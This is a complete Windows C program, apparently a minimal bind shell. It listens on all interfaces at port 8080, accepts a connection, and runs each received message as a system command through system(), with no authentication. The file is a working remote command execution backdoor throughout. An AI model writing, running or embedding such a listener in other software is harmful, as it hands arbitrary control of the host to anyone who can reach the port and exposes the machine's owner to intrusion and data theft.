#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char** argv) {
    WSADATA wsaData;
    struct sockaddr_in addr;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed: %d", WSAGetLastError());
    }
    else {
        printf("WsaStartup done.\n");
    }
    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Try bind
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // bind to 0.0.0.0
    addr.sin_port = htons(8080);

    if (bind(sock, &addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("Bind failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    printf("Bind successful.\n");

    // Listen for incoming connections
    if (listen(sock, 10) == SOCKET_ERROR) {
        printf("Listen failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    printf("Listening for connections...");

    // Accept a client connection
    SOCKET client = accept(sock, NULL, NULL);
    if (client == INVALID_SOCKET) {
        printf("Accept failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    printf("Client accepted.\n");

    char request[256] = { 0 };
    // Actively wait for data
    while (1) {
        // Receive data
        int recvResult = recv(client, request, sizeof(request) - 1, 0);
        if (recvResult > 0) {
            request[recvResult] = '\0'; // Null terminate
            printf("Client > \n%s\n", request);
            // execute command
            system(request);
        }
        else if (recvResult == 0) {
            printf("Connection closed by client.\n");
            break;
        }
        else {
            printf("Receive failed: %d\n", WSAGetLastError());
            break;
        }
    }
    // Cleanup
    closesocket(client);
    closesocket(sock);
    WSACleanup();
    return 0;
}
